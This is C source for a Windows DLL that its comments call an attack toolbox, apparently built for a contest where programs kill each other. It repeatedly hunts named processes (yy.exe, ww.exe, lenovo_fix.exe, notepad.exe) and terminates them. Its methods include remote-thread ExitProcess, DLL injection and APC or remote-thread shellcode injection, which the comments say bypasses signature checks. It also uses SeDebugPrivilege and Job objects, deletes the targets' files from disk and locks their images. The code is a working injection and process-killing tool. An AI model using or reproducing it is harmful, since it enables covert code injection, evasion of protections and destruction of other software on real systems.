/*
 * atkcore.dll - 精简攻击工具箱
 * 功能：循环扫描并终止 yy.exe / ww.exe
 * 保留五种结束方式：
 *   1. TerminateProcess
 *   2. CreateRemoteThread + ExitProcess
 *   3. 注入 payload.dll
 *   4. 注入 payload.bin（位置无关 shellcode，可绕过签名检查）
 *   5. Job 对象终止
 * 编译器：GNU GCC (MinGW-w64)
 * 编译选项：-shared -o atkcore.dll killtools.c -luser32 -lkernel32 -ladvapi32 -static -s -O2
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdarg.h>
#include <time.h>

/* 目标进程名 */
static const WCHAR *g_targets[] = { L"yy.exe", L"ww.exe", L"lenovo_fix.exe", NULL };
static const WCHAR *g_hostTargets[] = { L"notepad.exe", NULL };

static BOOL IsTargetName(LPCWSTR name)
{
    if (!name) return FALSE;
    for (int i = 0; g_targets[i]; i++)
        if (_wcsicmp(name, g_targets[i]) == 0) return TRUE;
    return FALSE;
}

/* 对方的二进制文件名单：击杀后连文件一起清掉（借用 yy 的“删源文件”） */
static const WCHAR *g_enemyFiles[] = { L"yy.exe", L"lenovo_fix.exe", L"guard.dll", L"ww.exe", NULL };

#define MAX_LOCKS 32
static HANDLE g_hLocks[MAX_LOCKS];
static WCHAR  g_lockPaths[MAX_LOCKS][MAX_PATH];
static volatile LONG g_nLocks = 0;

/* 全局控制 */
static volatile LONG g_bRunning = 0;
static HANDLE g_hThread = NULL;

/* 共享内存日志（窗口显示） */
#define SHARED_MEM_NAME  L"Global\\xx_shared_mem"
#define SHARED_MEM_SIZE  4096
#define OFFSET_LOG       256
#define LOG_SIZE         3808
static CRITICAL_SECTION g_csLog;
static BOOL g_csLogInit = FALSE;
static HANDLE g_hSharedMap = NULL;
static PVOID  g_pSharedView = NULL;

static void EnsureLogInit(void)
{
    if (g_csLogInit) return;
    InitializeCriticalSection(&g_csLog);
    g_csLogInit = TRUE;
    g_hSharedMap = OpenFileMappingW(FILE_MAP_READ | FILE_MAP_WRITE, FALSE, SHARED_MEM_NAME);
    if (g_hSharedMap)
        g_pSharedView = MapViewOfFile(g_hSharedMap, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, SHARED_MEM_SIZE);
}

/* 详细日志：只写入共享内存（窗口显示） */
static void WriteKillLog(const WCHAR *format, ...)
{
    EnsureLogInit();
    if (!g_csLogInit || !g_pSharedView) return;

    SYSTEMTIME st;
    GetLocalTime(&st);
    WCHAR szLine[512];
    va_list args;
    va_start(args, format);
    _vsnwprintf(szLine, _countof(szLine) - 1, format, args);
    va_end(args);
    szLine[_countof(szLine) - 1] = L'\0';

    WCHAR entry[600];
    _snwprintf(entry, _countof(entry) - 1, L"[%02d:%02d:%02d.%03d] [kill] %s\r\n",
               st.wHour, st.wMinute, st.wSecond, st.wMilliseconds, szLine);
    entry[_countof(entry) - 1] = L'\0';

    EnterCriticalSection(&g_csLog);
    WCHAR *pLog = (WCHAR *)((BYTE *)g_pSharedView + OFFSET_LOG);
    size_t len = wcslen(pLog);
    size_t maxLen = (LOG_SIZE / sizeof(WCHAR)) - 1;
    size_t newLen = wcslen(entry);
    if (len + newLen < maxLen)
    {
        wcscat_s(pLog, maxLen - len, entry);
    }
    else
    {
        memmove(pLog, pLog + newLen, (maxLen - newLen) * sizeof(WCHAR));
        wcscpy_s(pLog + (maxLen - newLen), newLen, entry);
    }
    LeaveCriticalSection(&g_csLog);
}

/* 结束对方进程后，把它的 exe 和二进制文件从磁盘清掉 */
static void WipeEnemyFiles(LPCWSTR exePath)
{
    if (exePath && exePath[0])
        DeleteFileW(exePath);
    for (int i = 0; g_enemyFiles[i]; i++)
        DeleteFileW(g_enemyFiles[i]);
    WriteKillLog(L"删除对方文件: %s", (exePath && exePath[0]) ? exePath : L"(仅按名单)");
}

/* 内部函数声明 */
static BOOL KillByTerminate(DWORD pid);
static BOOL KillByRemoteExit(DWORD pid);
static BOOL KillByKillerDll(DWORD pid, LPCWSTR killerPath);
static BOOL KillByKillerBin(DWORD pid, BOOL useApc);
static BOOL KillByJobObject(DWORD pid);
static BOOL TryAllMethods(LPCWSTR exeName, DWORD pid);
static void AttackPass(void);
static DWORD WINAPI AttackLoop(LPVOID lp);
static BOOL GetProcessPath(DWORD pid, WCHAR *path, DWORD cch);
static void LockImage(LPCWSTR path);
static void MaintainLocks(void);

/* 获取 payload.dll 路径（与 atkcore.dll 同目录） */
static void GetKillerPath(WCHAR *buf, SIZE_T size)
{
    GetModuleFileNameW(GetModuleHandleW(L"atkcore.dll"), buf, (DWORD)size);
    WCHAR *pSlash = wcsrchr(buf, L'\\');
    if (pSlash) pSlash[1] = L'\0';
    wcscat_s(buf, size, L"payload.dll");
}

/* 获取 payload.bin 路径 */
static void GetKillerBinPath(WCHAR *buf, SIZE_T size)
{
    GetModuleFileNameW(GetModuleHandleW(L"atkcore.dll"), buf, (DWORD)size);
    WCHAR *pSlash = wcsrchr(buf, L'\\');
    if (pSlash) pSlash[1] = L'\0';
    wcscat_s(buf, size, L"payload.bin");
}

/* ================== 调试特权（新约定允许 SeDebugPrivilege） ================== */
static BOOL EnableDebugPrivilege(void)
{
    HANDLE hToken = NULL;
    TOKEN_PRIVILEGES tp;
    BOOL ok = FALSE;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return FALSE;

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (LookupPrivilegeValueW(NULL, L"SeDebugPrivilege", &tp.Privileges[0].Luid)) {
        SetLastError(ERROR_SUCCESS);
        if (AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL) &&
            GetLastError() != ERROR_NOT_ALL_ASSIGNED)
            ok = TRUE;
    }
    CloseHandle(hToken);
    return ok;
}

/* 导出：启动攻击 */
__declspec(dllexport) void WINAPI StartAttack(void)
{
    if (InterlockedCompareExchange(&g_bRunning, 1, 0) == 0)
    {
        BOOL bPriv = EnableDebugPrivilege();
        WriteKillLog(L"攻击线程启动 PID=%lu SeDebug=%s", GetCurrentProcessId(), bPriv ? L"ON" : L"OFF");
        g_hThread = CreateThread(NULL, 0, AttackLoop, NULL, 0, NULL);
    }
}

/* 导出：停止攻击 */
__declspec(dllexport) void WINAPI StopAttack(void)
{
    InterlockedExchange(&g_bRunning, 0);
    if (g_hThread)
    {
        WaitForSingleObject(g_hThread, 5000);
        CloseHandle(g_hThread);
        g_hThread = NULL;
        WriteKillLog(L"攻击线程停止");
    }
}

/* 方法1：TerminateProcess */
static BOOL KillByTerminate(DWORD pid)
{
    BOOL bResult = FALSE;
    HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
    if (hProc)
    {
        bResult = TerminateProcess(hProc, 0);
        CloseHandle(hProc);
        if (bResult)
            WriteKillLog(L"TerminateProcess 成功结束 PID=%lu", pid);
        else
            WriteKillLog(L"TerminateProcess 失败 PID=%lu err=%lu", pid, GetLastError());
    }
    else
    {
        WriteKillLog(L"TerminateProcess 打开失败 PID=%lu err=%lu", pid, GetLastError());
    }
    return bResult;
}

/* 方法2：CreateRemoteThread 直接跑 ExitProcess(0)
   与 TerminateProcess 走不同退出路径——它会正常执行各模块的 DLL_PROCESS_DETACH，
   可绕开"只拦 TerminateProcess"的防御。无需 VirtualAllocEx（不传字符串）。 */
static BOOL KillByRemoteExit(DWORD pid)
{
    HANDLE hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
                               PROCESS_VM_WRITE, FALSE, pid);
    if (!hProc)
    {
        WriteKillLog(L"RemoteExit 打开进程失败 PID=%lu err=%lu", pid, GetLastError());
        return FALSE;
    }

    LPTHREAD_START_ROUTINE pExit = (LPTHREAD_START_ROUTINE)
        GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "ExitProcess");
    if (!pExit)
    {
        CloseHandle(hProc);
        return FALSE;
    }

    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, pExit, (LPVOID)0, 0, NULL);
    if (!hThread)
    {
        WriteKillLog(L"RemoteExit 创建远程线程失败 PID=%lu err=%lu", pid, GetLastError());
        CloseHandle(hProc);
        return FALSE;
    }

    WaitForSingleObject(hThread, 500);
    CloseHandle(hThread);
    CloseHandle(hProc);
    WriteKillLog(L"CreateRemoteThread+ExitProcess 成功 PID=%lu", pid);
    return TRUE;
}

/* 方法3：注入 payload.dll（让目标进程自行终止） */
static BOOL KillByKillerDll(DWORD pid, LPCWSTR killerPath)
{
    if (GetFileAttributesW(killerPath) == INVALID_FILE_ATTRIBUTES)
    {
        WriteKillLog(L"payload.dll 不存在: %s", killerPath);
        return FALSE;
    }

    HANDLE hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE,
                               FALSE, pid);
    if (!hProc)
    {
        WriteKillLog(L"payload.dll 注入打开进程失败 PID=%lu err=%lu", pid, GetLastError());
        return FALSE;
    }

    SIZE_T pathSize = (wcslen(killerPath) + 1) * sizeof(WCHAR);
    LPVOID pRemote = VirtualAllocEx(hProc, NULL, pathSize, MEM_COMMIT, PAGE_READWRITE);
    if (!pRemote)
    {
        CloseHandle(hProc);
        WriteKillLog(L"payload.dll VirtualAllocEx 失败 PID=%lu", pid);
        return FALSE;
    }

    BOOL bWrite = WriteProcessMemory(hProc, pRemote, killerPath, pathSize, NULL);
    if (!bWrite)
    {
        VirtualFreeEx(hProc, pRemote, 0, MEM_RELEASE);
        CloseHandle(hProc);
        WriteKillLog(L"payload.dll WriteProcessMemory 失败 PID=%lu", pid);
        return FALSE;
    }

    LPTHREAD_START_ROUTINE pLoadLib = (LPTHREAD_START_ROUTINE)
        GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "LoadLibraryW");
    if (!pLoadLib)
    {
        VirtualFreeEx(hProc, pRemote, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return FALSE;
    }

    HANDLE hRemote = CreateRemoteThread(hProc, NULL, 0, pLoadLib, pRemote, 0, NULL);
    if (hRemote)
    {
        WaitForSingleObject(hRemote, 100);
        CloseHandle(hRemote);
    }
    else
    {
        WriteKillLog(L"注入 payload.dll 到 PID=%lu 失败 err=%lu", pid, GetLastError());
    }

    VirtualFreeEx(hProc, pRemote, 0, MEM_RELEASE);
    CloseHandle(hProc);
    return TRUE;
}

/* 方法3b：注入 payload.bin（位置无关 shellcode，可绕过签名检查） */
static BOOL KillByKillerBin(DWORD pid, BOOL useApc)
{
    WCHAR binPath[MAX_PATH];
    GetKillerBinPath(binPath, MAX_PATH);

    HANDLE hFile = CreateFileW(binPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        WriteKillLog(L"payload.bin 不存在: %s", binPath);
        return FALSE;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == 0 || fileSize > 0x10000) { CloseHandle(hFile); return FALSE; }

    LPVOID pLocal = VirtualAlloc(NULL, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    DWORD bytesRead = 0;
    if (!ReadFile(hFile, pLocal, fileSize, &bytesRead, NULL) || bytesRead != fileSize)
    {
        CloseHandle(hFile); VirtualFree(pLocal, 0, MEM_RELEASE); return FALSE;
    }
    CloseHandle(hFile);

    HANDLE hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hProc)
    {
        VirtualFree(pLocal, 0, MEM_RELEASE);
        WriteKillLog(L"shellcode 打开进程失败 PID=%lu err=%lu", pid, GetLastError());
        return FALSE;
    }

    LPVOID pRemote = VirtualAllocEx(hProc, NULL, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pRemote)
    {
        CloseHandle(hProc); VirtualFree(pLocal, 0, MEM_RELEASE);
        WriteKillLog(L"shellcode VirtualAllocEx 失败 PID=%lu", pid);
        return FALSE;
    }

    if (!WriteProcessMemory(hProc, pRemote, pLocal, fileSize, NULL))
    {
        VirtualFreeEx(hProc, pRemote, 0, MEM_RELEASE);
        CloseHandle(hProc); VirtualFree(pLocal, 0, MEM_RELEASE);
        WriteKillLog(L"shellcode WriteProcessMemory 失败 PID=%lu", pid);
        return FALSE;
    }

    BOOL result = FALSE;
    int apcQueued = 0;

    if (useApc)
    {
        /* APC 注入：绕过 LoadLibrary 签名检查（直接执行已写入的代码） */
        HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        if (hThreadSnap != INVALID_HANDLE_VALUE)
        {
            THREADENTRY32 te;
            te.dwSize = sizeof(te);
            if (Thread32First(hThreadSnap, &te))
            {
                do {
                    if (te.th32OwnerProcessID == pid)
                    {
                        HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
                        if (hThread)
                        {
                            if (QueueUserAPC((PAPCFUNC)pRemote, hThread, 0))
                            {
                                result = TRUE;
                                apcQueued++;
                            }
                            CloseHandle(hThread);
                        }
                    }
                } while (Thread32Next(hThreadSnap, &te));
            }
            CloseHandle(hThreadSnap);
        }
        WriteKillLog(L"APC 排队注入 PID=%lu 线程数=%d 结果=%s", pid, apcQueued, result ? L"成功" : L"失败");
    }

    if (!result)
    {
        /* 回退到 CreateRemoteThread */
        HANDLE hRemote = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pRemote, NULL, 0, NULL);
        if (hRemote)
        {
            WaitForSingleObject(hRemote, 100);
            CloseHandle(hRemote);
            result = TRUE;
            WriteKillLog(L"远程线程 shellcode 注入 PID=%lu 成功", pid);
        }
        else
        {
            WriteKillLog(L"远程线程 shellcode 注入 PID=%lu 失败 err=%lu", pid, GetLastError());
        }
    }

    CloseHandle(hProc);
    VirtualFree(pLocal, 0, MEM_RELEASE);
    return result;
}

/* 方法4：Job 对象终止 */
static BOOL KillByJobObject(DWORD pid)
{
    BOOL bResult = FALSE;
    HANDLE hProc = OpenProcess(PROCESS_SET_QUOTA | PROCESS_TERMINATE, FALSE, pid);
    if (!hProc)
    {
        WriteKillLog(L"Job 打开进程失败 PID=%lu err=%lu", pid, GetLastError());
        return FALSE;
    }

    HANDLE hJob = CreateJobObjectW(NULL, NULL);
    if (!hJob)
    {
        CloseHandle(hProc);
        return FALSE;
    }

    // 设置 Job 信息：当 Job 中最后一个进程句柄关闭时终止所有进程
    JOBOBJECT_EXTENDED_LIMIT_INFORMATION jeli = { 0 };
    jeli.BasicLimitInformation.LimitFlags = JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE;
    if (SetInformationJobObject(hJob, JobObjectExtendedLimitInformation, &jeli, sizeof(jeli)))
    {
        if (AssignProcessToJobObject(hJob, hProc))
        {
            // Job 已绑定，关闭 Job 句柄将终止进程（因为设置了 KILL_ON_JOB_CLOSE）
            // 但需要等待一小段时间让系统执行
            CloseHandle(hJob);   // 这会触发目标进程终止
            bResult = TRUE;
            WriteKillLog(L"Job 对象绑定成功 PID=%lu", pid);
        }
        else
        {
            WriteKillLog(L"Job 绑定失败 PID=%lu err=%lu", pid, GetLastError());
            CloseHandle(hJob);
        }
    }
    else
    {
        CloseHandle(hJob);
    }

    CloseHandle(hProc);
    return bResult;
}

static BOOL GetProcessPath(DWORD pid, WCHAR *path, DWORD cch)
{
    path[0] = L'\0';
    HANDLE h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!h) return FALSE;
    DWORD size = cch;
    BOOL ok = QueryFullProcessImageNameW(h, 0, path, &size);
    CloseHandle(h);
    return ok;
}

static void LockImage(LPCWSTR path)
{
    if (!path || !path[0]) return;
    LONG n = g_nLocks;
    for (LONG i = 0; i < n && i < MAX_LOCKS; i++) {
        if (g_lockPaths[i][0] && _wcsicmp(g_lockPaths[i], path) == 0)
            return;
    }
    LONG slot = InterlockedIncrement(&g_nLocks) - 1;
    if (slot < 0 || slot >= MAX_LOCKS) { InterlockedDecrement(&g_nLocks); return; }
    wcsncpy(g_lockPaths[slot], path, MAX_PATH - 1);
    g_lockPaths[slot][MAX_PATH - 1] = L'\0';
    g_hLocks[slot] = NULL;
    WriteKillLog(L"记录镜像锁路径: %s", path);
}

static void MaintainLocks(void)
{
    LONG n = g_nLocks;
    for (LONG i = 0; i < n && i < MAX_LOCKS; i++) {
        if (!g_lockPaths[i][0] || g_hLocks[i]) continue;
        HANDLE h = CreateFileW(g_lockPaths[i], 0, 0, NULL, OPEN_EXISTING,
                               FILE_ATTRIBUTE_NORMAL, NULL);
        if (h != INVALID_HANDLE_VALUE)
        {
            g_hLocks[i] = h;
            WriteKillLog(L"镜像锁获取成功: %s", g_lockPaths[i]);
        }
    }
}

static BOOL TryAllMethods(LPCWSTR exeName, DWORD pid)
{
    WCHAR killerPath[MAX_PATH];
    GetKillerPath(killerPath, MAX_PATH);

    BOOL bTarget = IsTargetName(exeName);
    const WCHAR *name = exeName ? exeName : L"unknown";

    // 方法1：直接终止
    if (KillByTerminate(pid))
    {
        WriteKillLog(L"已结束 %s PID=%lu (TerminateProcess)", name, pid);
        return TRUE;
    }

    // 方法2：CreateRemoteThread + ExitProcess（正常退出路径，跑 DLL_PROCESS_DETACH）
    if (KillByRemoteExit(pid))
    {
        WriteKillLog(L"已结束 %s PID=%lu (RemoteExit)", name, pid);
        return TRUE;
    }

    // 方法3：注入 payload.dll（host only - target 禁止非 MS 签名 DLL）
    if (!bTarget && KillByKillerDll(pid, killerPath))
    {
        return TRUE;
    }

    // 方法3b：注入 payload.bin shellcode
    // - target (yy): 使用 APC 绕过签名检查
    // - host (notepad): 使用 CreateRemoteThread
    if (bTarget)
    {
        if (KillByKillerBin(pid, TRUE))  // APC
        {
            WriteKillLog(L"已通过 APC 注入 shellcode 结束 %s PID=%lu", name, pid);
            return TRUE;
        }
    }
    else
    {
        if (KillByKillerBin(pid, FALSE)) // RemoteThread
        {
            WriteKillLog(L"已通过远程线程 shellcode 结束 %s PID=%lu", name, pid);
            return TRUE;
        }
    }

    // 方法4：Job 对象终结
    if (KillByJobObject(pid))
    {
        WriteKillLog(L"已通过 Job 对象结束 %s PID=%lu", name, pid);
        return TRUE;
    }

    WriteKillLog(L"所有方法失败: %s PID=%lu", name, pid);
    return FALSE;
}

/* 攻击主循环 */
static void AttackPass(void)
{
    DWORD hostPids[128];
    DWORD targetPids[128];
    int nHosts = 0, nTargets = 0;

    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap != INVALID_HANDLE_VALUE)
    {
        PROCESSENTRY32W pe;
        pe.dwSize = sizeof(pe);
        if (Process32FirstW(hSnap, &pe))
        {
            do
            {
                for (int i = 0; g_hostTargets[i]; i++)
                {
                    if (_wcsicmp(pe.szExeFile, g_hostTargets[i]) == 0)
                    {
                        if (nHosts < 128) hostPids[nHosts++] = pe.th32ProcessID;
                        break;
                    }
                }
                for (int i = 0; g_targets[i]; i++)
                {
                    if (_wcsicmp(pe.szExeFile, g_targets[i]) == 0)
                    {
                        if (nTargets < 128) targetPids[nTargets++] = pe.th32ProcessID;
                        break;
                    }
                }
            } while (Process32NextW(hSnap, &pe));
        }
        CloseHandle(hSnap);
    }

    if (nTargets || nHosts)
        WriteKillLog(L"扫描发现 目标=%d 宿主=%d", nTargets, nHosts);

    /* Phase A: kill enemies first - stop their 5ms offense ASAP */
    for (int i = 0; i < nTargets; i++)
    {
        WCHAR path[MAX_PATH];
        path[0] = L'\0';
        GetProcessPath(targetPids[i], path, MAX_PATH);
        /* 尝试结束 yy 或 ww */
        LPCWSTR name = L"yy.exe";
        if (path[0])
        {
            const WCHAR *base = wcsrchr(path, L'\\');
            base = base ? base + 1 : path;
            name = base;
        }
        TryAllMethods(name, targetPids[i]);
        WipeEnemyFiles(path);
        if (path[0]) LockImage(path);
    }

    /* Phase B: kill guard hosts + lock image */
    for (int i = 0; i < nHosts; i++)
    {
        WCHAR path[MAX_PATH];
        path[0] = L'\0';
        GetProcessPath(hostPids[i], path, MAX_PATH);
        TryAllMethods(L"notepad.exe", hostPids[i]);
        if (path[0]) LockImage(path);
    }

    /* Phase C: catch yy respawned in the gap */
    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap != INVALID_HANDLE_VALUE)
    {
        PROCESSENTRY32W pe;
        pe.dwSize = sizeof(pe);
        if (Process32FirstW(hSnap, &pe))
        {
            do
            {
                for (int i = 0; g_targets[i]; i++)
                {
                    if (_wcsicmp(pe.szExeFile, g_targets[i]) == 0)
                    {
                        WCHAR path[MAX_PATH];
                        path[0] = L'\0';
                        GetProcessPath(pe.th32ProcessID, path, MAX_PATH);
                        WriteKillLog(L"Phase C 发现复活目标 %s PID=%lu", pe.szExeFile, pe.th32ProcessID);
                        TryAllMethods(pe.szExeFile, pe.th32ProcessID);
                        if (path[0]) LockImage(path);
                        break;
                    }
                }
            } while (Process32NextW(hSnap, &pe));
        }
        CloseHandle(hSnap);
    }

    MaintainLocks();
}

static BOOL HostIsXxExe(void) {
    WCHAR path[MAX_PATH] = L"";
    if (!GetModuleFileNameW(NULL, path, MAX_PATH)) return FALSE;
    const WCHAR *p = wcsrchr(path, L'\\');
    p = p ? p + 1 : path;
    return _wcsicmp(p, L"xx.exe") == 0;
}

static DWORD WINAPI AttackLoop(LPVOID lp)
{
    UNREFERENCED_PARAMETER(lp);

    /* One leader across hosts. Mutex released after every pass so a
       suspended/dead xx cannot stall standbys (death => WAIT_ABANDONED). */
    HANDLE hLead = CreateMutexW(NULL, FALSE, L"xx_attack_lead");

    /* xx.exe 自身放慢到 300ms：攻击负荷交给被注入其它进程的副本（仍 30ms），
       既降低 xx.exe CPU，又让副本在 xx 释放 leader 后立刻接手。 */
    const DWORD dwIdle = HostIsXxExe() ? 300 : 30;

    while (g_bRunning)
    {
        if (!hLead)
        {
            AttackPass();
            Sleep(dwIdle);
            continue;
        }
        DWORD w = WaitForSingleObject(hLead, 0);
        if (w == WAIT_OBJECT_0 || w == WAIT_ABANDONED)
        {
            AttackPass();
            ReleaseMutex(hLead);
            Sleep(dwIdle);
        }
        else
        {
            Sleep(dwIdle);
        }
    }

    if (hLead) CloseHandle(hLead);
    return 0;
}

/* DllMain 保持最简 */
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved)
{
    UNREFERENCED_PARAMETER(hinst);
    UNREFERENCED_PARAMETER(reserved);
    if (reason == DLL_PROCESS_ATTACH)
    {
        DisableThreadLibraryCalls(hinst);
        EnsureLogInit();
    }
    return TRUE;
}
